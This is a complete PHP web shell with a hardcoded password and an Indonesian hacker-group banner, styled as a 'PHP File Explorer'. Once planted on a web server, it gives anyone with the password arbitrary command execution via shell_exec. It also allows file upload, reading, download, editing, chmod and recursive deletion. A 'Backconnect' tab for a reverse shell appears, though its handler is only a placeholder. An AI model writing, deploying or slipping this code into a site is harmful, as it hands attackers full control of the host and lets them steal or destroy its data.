<?php
// Author yourdre4m7
// Recode? nub anjeng wkwkkw
// recode izin ya kimak

error_reporting(0);

$password = 'dre4m1337';
session_start();
if (!isset($_SESSION['logged_in']) && (!isset($_POST['pass']) || $_POST['pass'] !== $password)) {
    echo '<center>
	<pre>
 ___________________________
< root@indonesianxploit~yourdre4m7 >
 ---------------------------
	</pre><form method="post"><input type="password" name="pass"><button type="submit">Login</button></form></center>';
    exit;
} else {
    $_SESSION['logged_in'] = true;
}
// ======================
// Handle AJAX Terminal Command
if (isset($_POST['ajax_terminal_cmd'])) {
    $cmd = $_POST['ajax_terminal_cmd'];
    $output = shell_exec($cmd . ' 2>&1');
    echo htmlspecialchars($output);
    exit;
}

// ======================
// Current directory handling
$dir = isset($_GET['dir']) && is_dir($_GET['dir']) ? $_GET['dir'] : getcwd();

// ===============
// Actions: delete, download, rename, chmod, edit file
if (isset($_GET['delete'])) {
    $p = $_GET['delete'];
    if (is_dir($p)) deleteDirectory($p);
    else unlink($p);
    header("Location: ?dir=" . urlencode($dir));
    exit;
}

if (isset($_GET['download'])) {
    $f = $_GET['download'];
    if (is_file($f)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($f) . '"');
        header('Content-Length: ' . filesize($f));
        readfile($f);
        exit;
    }
}

if (isset($_GET['readfile'])) {
    $f = $_GET['readfile'];
    if (file_exists($f) && is_file($f)) {
        header("Content-Type: text/plain");
        echo file_get_contents($f);
    } else {
        http_response_code(404);
        echo "File not found";
    }
    exit;
}

if (isset($_POST['rename_old'], $_POST['rename_new'])) {
    $old = $_POST['rename_old'];
    $new = dirname($old) . '/' . basename($_POST['rename_new']);
    if (file_exists($old) && !file_exists($new)) rename($old, $new);
    header("Location: ?dir=" . urlencode($dir));
    exit;
}

if (isset($_POST['chmod_target'], $_POST['chmod_mode'])) {
    $target = $_POST['chmod_target'];
    $mode = octdec($_POST['chmod_mode']);
    if (file_exists($target)) chmod($target, $mode);
    header("Location: ?dir=" . urlencode($dir));
    exit;
}

if (isset($_POST['edit_path'], $_POST['edit_content'])) {
    file_put_contents($_POST['edit_path'], $_POST['edit_content']);
    header("Location: ?dir=" . urlencode($dir));
    exit;
}

// Upload file handler
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['fileToUpload'])) {
    $uploadDir = $dir . DIRECTORY_SEPARATOR;
    $targetFile = $uploadDir . basename($_FILES["fileToUpload"]["name"]);

    if ($_FILES["fileToUpload"]["size"] > 5 * 1024 * 1024) {
        $uploadMsg = "<p style='color:red;'>Error: File terlalu besar (max 5MB).</p>";
    } else {
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $targetFile)) {
            $uploadMsg = "<p style='color:green;'>File " . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " berhasil diupload.</p>";
        } else {
            $uploadMsg = "<p style='color:red;'>Error saat mengupload file.</p>";
        }
    }
}

// Create folder handler
if (isset($_POST['new_folder_name'])) {
    $newFolder = $dir . DIRECTORY_SEPARATOR . basename($_POST['new_folder_name']);
    if (!file_exists($newFolder)) {
        mkdir($newFolder);
        header("Location: ?dir=" . urlencode($dir));
        exit;
    } else {
        $folderMsg = "<p style='color:red;'>Folder sudah ada.</p>";
    }
}

// Create file handler
if (isset($_POST['new_file_name'])) {
    $newFile = $dir . DIRECTORY_SEPARATOR . basename($_POST['new_file_name']);
    if (!file_exists($newFile)) {
        file_put_contents($newFile, "");
        header("Location: ?dir=" . urlencode($dir));
        exit;
    } else {
        $fileMsg = "<p style='color:red;'>File sudah ada.</p>";
    }
}

// Delete directory recursive function
function deleteDirectory($dir) {
    if (!file_exists($dir)) return;
    if (!is_dir($dir)) return unlink($dir);
    foreach (scandir($dir) as $item) {
        if (in_array($item, ['.', '..'])) continue;
        deleteDirectory($dir . '/' . $item);
    }
    rmdir($dir);
}

// Format size helper
function formatSize($bytes) {
    $sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($bytes >= 1024 && $i < count($sizes) - 1) {
        $bytes /= 1024;
        $i++;
    }
    return round($bytes, 2) . ' ' . $sizes[$i];
}

// Render file list table
function renderTable($dir) {
    $rows = '';
    foreach (scandir($dir) as $f) {
        if (in_array($f, ['.', '..'])) continue;
        $p = $dir . '/' . $f;
        $isDir = is_dir($p);
        $size = $isDir ? '-' : formatSize(filesize($p));
        $mod = date('Y-m-d H:i:s', filemtime($p));
        $perm = substr(sprintf('%o', fileperms($p)), -4);
        $rows .= "
<tr>
  <td><a href='" . ($isDir ? "?dir=" . urlencode($p) : "#") . "'>" . htmlspecialchars($f) . "</a></td>
  <td>$size</td>
  <td>$mod</td>
  <td><code>$perm</code></td>
  <td>
    " . (!$isDir ? "<a href='?download=" . urlencode($p) . "'>Download</a> | " : "") . "
    <a href='?delete=" . urlencode($p) . "&dir=" . urlencode($dir) . "' onclick='return confirm(\"Delete " . htmlspecialchars($f) . "?\")' style='color:red;'>Delete</a> |
    <a href='#' onclick='renamePrompt(\"" . addslashes($p) . "\",\"" . addslashes($f) . "\")'>Rename</a> |
    <a href='#' onclick='chmodPrompt(\"" . addslashes($p) . "\",\"$perm\")'>Chmod</a>" .
            (!$isDir ? " | <a href='#' onclick='editPrompt(\"" . addslashes($p) . "\")'>Edit</a>" : "") .
            "
  </td>
</tr>";
    }
    return "<table>
    <thead><tr><th>Name</th><th>Size</th><th>Modified</th><th>Perm</th><th>Action</th></tr></thead>
    <tbody>$rows</tbody>
    </table>";
}

function pathBreadcrumb($dir) {
    $parts = explode(DIRECTORY_SEPARATOR, $dir);
    $path = '';
    $crumbs = [];
    // Build breadcrumb links
    foreach ($parts as $part) {
        if ($part === '') continue;
        $path .= DIRECTORY_SEPARATOR . $part;
        $crumbs[] = "<a href='?dir=" . urlencode($path) . "'>" . htmlspecialchars($part) . "</a>";
    }
    return implode(' / ', $crumbs);
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>PHP File Explorer</title>
<style>
  /* Reset & base */
  * { box-sizing: border-box; }
  body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background-color: #121212;
    color: #eee;
    margin: 0; padding: 0;
  }
  a {
    color: #67e167;
    text-decoration: none;
  }
  a:hover {
    text-decoration: underline;
  }
  header {
    background: #1f1f1f;
    padding: 10px 20px;
    font-size: 1.2rem;
    font-weight: 600;
    user-select: none;
  }
  main {
    padding: 20px;
  }
  table {
    width: 100%;
    border-collapse: collapse;
    margin-top: 15px;
  }
  th, td {
    border: 1px solid #333;
    padding: 10px;
    text-align: center;
    font-family: monospace;
  }
  th {
    background: #222;
  }
  tbody tr:hover {
    background-color: #222;
  }
  /* Tabs nav */
  .tabs {
    display: flex;
    gap: 10px;
    margin-bottom: 20px;
    flex-wrap: wrap;
  }
  .tab-button {
    background: #222;
    color: #ccc;
    border: none;
    padding: 10px 15px;
    cursor: pointer;
    border-radius: 6px 6px 0 0;
    font-weight: 600;
    transition: background-color 0.3s;
  }
  .tab-button:hover {
    background: #67e167;
    color: #121212;
  }
  .tab-button.active {
    background: #67e167;
    color: #121212;
  }
  .tab-content {
    background: #222;
    border-radius: 0 6px 6px 6px;
    padding: 20px;
    display: none;
    min-height: 400px;
  }
  .tab-content.active {
    display: block;
  }
  /* Forms */
  input[type="text"], input[type="file"], textarea {
    width: 100%;
    background: #121212;
    border: 1px solid #555;
    color: #eee;
    padding: 8px 10px;
    border-radius: 4px;
    font-family: monospace;
  }
  input[type="text"]:focus, textarea:focus {
    outline: 2px solid #67e167;
    background: #1a1a1a;
  }
  button.btn {
    background: #67e167;
    border: none;
    color: #121212;
    padding: 8px 15px;
    border-radius: 5px;
    cursor: pointer;
    font-weight: 600;
    transition: background-color 0.3s;
  }
  button.btn:hover {
    background: #55c255;
  }
  /* Modal */
  .modal {
    position: fixed;
    top:0; left:0; width: 100%; height: 100%;
    background: rgba(0,0,0,0.7);
    display: none;
    justify-content: center;
    align-items: center;
    z-index: 1000;
  }
  .modal-content {
    background: #222;
    border-radius: 8px;
    padding: 20px;
    width: 500px;
    max-width: 90%;
    color: #eee;
    font-family: monospace;
  }
  .modal-content h3 {
    margin-top: 0;
  }
  .modal-content input, .modal-content textarea {
    margin: 10px 0;
  }
  .modal-content button {
    margin-right: 10px;
  }
  .modal-content .cancel {
    background: #e55353;
    color: #fff;
  }
  /* Terminal */
  #terminalOutput {
    background: #000;
    color: #0f0;
    height: 300px;
    overflow-y: auto;
    padding: 10px;
    font-family: monospace;
    border-radius: 6px;
  }
  /* Breadcrumb */
  #breadcrumb {
    margin-bottom: 10px;
    font-family: monospace;
  }
  /* Responsive */
  @media (max-width:600px) {
    .tab-button {
      flex: 1 1 100%;
      border-radius: 0;
    }
    .modal-content {
      width: 95%;
    }
  }
</style>
</head>
<body>
<header>Current Directory : <span id="breadcrumb"><?= pathBreadcrumb($dir) ?></span></header>
<main>
  <div class="tabs" role="tablist" aria-label="File Explorer Tabs">
    <button class="tab-button active" role="tab" aria-selected="true" aria-controls="tab-1" id="tabBtn1">Explorer</button>
    <button class="tab-button" role="tab" aria-selected="false" aria-controls="tab-2" id="tabBtn2">Upload</button>
    <button class="tab-button" role="tab" aria-selected="false" aria-controls="tab-3" id="tabBtn3">Terminal</button>
    <button class="tab-button" role="tab" aria-selected="false" aria-controls="tab-4" id="tabBtn4">Create Folder/File</button>
    <button class="tab-button" role="tab" aria-selected="false" aria-controls="tab-5" id="tabBtn5">Backconnect</button>
  </div>

  <!-- Explorer Tab -->
  <section id="tab-1" class="tab-content active" role="tabpanel" aria-labelledby="tabBtn1" tabindex="0">
    <?= renderTable($dir) ?>
  </section>

  <!-- Upload Tab -->
  <section id="tab-2" class="tab-content" role="tabpanel" aria-labelledby="tabBtn2" tabindex="0">
    <h2>Upload File</h2>
    <?= $uploadMsg ?? '' ?>
    <form method="post" enctype="multipart/form-data">
      <input type="file" name="fileToUpload" required>
      <br><br>
      <button type="submit" class="btn">Upload</button>
    </form>
  </section>

  <!-- Terminal Tab -->
  <section id="tab-3" class="tab-content" role="tabpanel" aria-labelledby="tabBtn3" tabindex="0">
    <h2>Terminal</h2>
    <input type="text" id="terminalCommand" placeholder="Enter command">
    <button class="btn" id="runCmdBtn">Run</button>
    <pre id="terminalOutput"></pre>
  </section>

  <!-- Create Folder/File Tab -->
  <section id="tab-4" class="tab-content" role="tabpanel" aria-labelledby="tabBtn4" tabindex="0">
    <h2>Create Folder</h2>
    <?= $folderMsg ?? '' ?>
    <form method="post">
      <input type="text" name="new_folder_name" placeholder="Folder Name" required>
      <button type="submit" class="btn">Create Folder</button>
    </form>
    <hr>
    <h2>Create File</h2>
    <?= $fileMsg ?? '' ?>
    <form method="post">
      <input type="text" name="new_file_name" placeholder="File Name" required>
      <button type="submit" class="btn">Create File</button>
    </form>
  </section>

  <!-- Backconnect Tab -->
  <section id="tab-5" class="tab-content" role="tabpanel" aria-labelledby="tabBtn5" tabindex="0">
    <h2>Backconnect</h2>
    <p><i>Fitur Backconnect bisa kamu sesuaikan sendiri. Contoh di bawah ini adalah template input sederhana.</i></p>
    <form id="backconnectForm">
      <label>IP / Hostname:</label>
      <input type="text" id="backconnect_host" placeholder="127.0.0.1" required>
      <label>Port:</label>
      <input type="number" id="backconnect_port" placeholder="4444" required>
      <button type="submit" class="btn">Connect</button>
    </form>
    <pre id="backconnectOutput" style="background:#111; color:#67e167; height:250px; overflow:auto; padding:10px; margin-top:10px; border-radius:6px; font-family: monospace;"></pre>
  </section>

</main>

<!-- Modals -->
<div id="modalRename" class="modal" role="dialog" aria-modal="true" aria-labelledby="modalRenameTitle">
  <div class="modal-content">
    <h3 id="modalRenameTitle">Rename</h3>
    <form method="post" id="renameForm">
      <input type="hidden" name="rename_old" id="renameOld" required>
      <input type="text" name="rename_new" id="renameNew" required>
      <br><br>
      <button type="submit" class="btn">Rename</button>
      <button type="button" class="btn cancel" onclick="closeModal('modalRename')">Cancel</button>
    </form>
  </div>
</div>

<div id="modalChmod" class="modal" role="dialog" aria-modal="true" aria-labelledby="modalChmodTitle">
  <div class="modal-content">
    <h3 id="modalChmodTitle">Change Permissions</h3>
    <form method="post" id="chmodForm">
      <input type="hidden" name="chmod_target" id="chmodTarget" required>
      <input type="text" name="chmod_mode" id="chmodMode" pattern="[0-7]{3,4}" title="Enter valid octal permission (e.g. 0755 or 755)" required>
      <br><br>
      <button type="submit" class="btn">Change</button>
      <button type="button" class="btn cancel" onclick="closeModal('modalChmod')">Cancel</button>
    </form>
  </div>
</div>

<div id="modalEdit" class="modal" role="dialog" aria-modal="true" aria-labelledby="modalEditTitle">
  <div class="modal-content">
    <h3 id="modalEditTitle">Edit File</h3>
    <form method="post" id="editForm">
      <input type="hidden" name="edit_path" id="editPath" required>
      <textarea name="edit_content" id="editContent" rows="15" required></textarea>
      <br>
      <button type="submit" class="btn">Save</button>
      <button type="button" class="btn cancel" onclick="closeModal('modalEdit')">Cancel</button>
    </form>
  </div>
</div>

<script>
  // Tabs logic
  const tabs = document.querySelectorAll('.tab-button');
  const contents = document.querySelectorAll('.tab-content');

  tabs.forEach(tab => {
    tab.addEventListener('click', () => {
      tabs.forEach(t => {
        t.classList.remove('active');
        t.setAttribute('aria-selected', 'false');
      });
      contents.forEach(c => c.classList.remove('active'));

      tab.classList.add('active');
      tab.setAttribute('aria-selected', 'true');
      document.getElementById(tab.getAttribute('aria-controls')).classList.add('active');
    });
  });

  // Modals functions
  function openModal(id) {
    document.getElementById(id).style.display = 'flex';
  }
  function closeModal(id) {
    document.getElementById(id).style.display = 'none';
  }

  // Rename prompt
  function renamePrompt(oldPath, oldName) {
    openModal('modalRename');
    document.getElementById('renameOld').value = oldPath;
    document.getElementById('renameNew').value = oldName;
    document.getElementById('renameNew').focus();
  }

  // Chmod prompt
  function chmodPrompt(target, currentPerm) {
    openModal('modalChmod');
    document.getElementById('chmodTarget').value = target;
    document.getElementById('chmodMode').value = currentPerm;
    document.getElementById('chmodMode').focus();
  }

  // Edit prompt (fetch file content)
  function editPrompt(path) {
    fetch('?readfile=' + encodeURIComponent(path))
    .then(res => res.text())
    .then(text => {
      openModal('modalEdit');
      document.getElementById('editPath').value = path;
      document.getElementById('editContent').value = text;
      document.getElementById('editContent').focus();
    })
    .catch(() => alert('Failed to load file'));
  }

  // Terminal command
  const runBtn = document.getElementById('runCmdBtn');
  const terminalInput = document.getElementById('terminalCommand');
  const terminalOutput = document.getElementById('terminalOutput');

  function runCommand() {
    const cmd = terminalInput.value.trim();
    if (!cmd) return;
    terminalOutput.textContent += `$ ${cmd}\n`;
    terminalInput.value = '';
    fetch('', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({ ajax_terminal_cmd: cmd })
    })
    .then(res => res.text())
    .then(out => {
      terminalOutput.textContent += out + '\n';
      terminalOutput.scrollTop = terminalOutput.scrollHeight;
    })
    .catch(() => {
      terminalOutput.textContent += 'Error executing command\n';
    });
  }

  runBtn.addEventListener('click', runCommand);
  terminalInput.addEventListener('keydown', e => {
    if (e.key === 'Enter') {
      e.preventDefault();
      runCommand();
    }
  });

  // Backconnect Form (dummy)
  const bcForm = document.getElementById('backconnectForm');
  const bcOutput = document.getElementById('backconnectOutput');
  bcForm.addEventListener('submit', e => {
    e.preventDefault();
    const host = document.getElementById('backconnect_host').value.trim();
    const port = document.getElementById('backconnect_port').value.trim();
    if (!host || !port) return alert('Fill both host and port!');
    bcOutput.textContent += `Attempting backconnect to ${host}:${port}...\n(This is a demo, implement your logic)\n`;
    bcOutput.scrollTop = bcOutput.scrollHeight;
  });
</script>

</body>
</html>
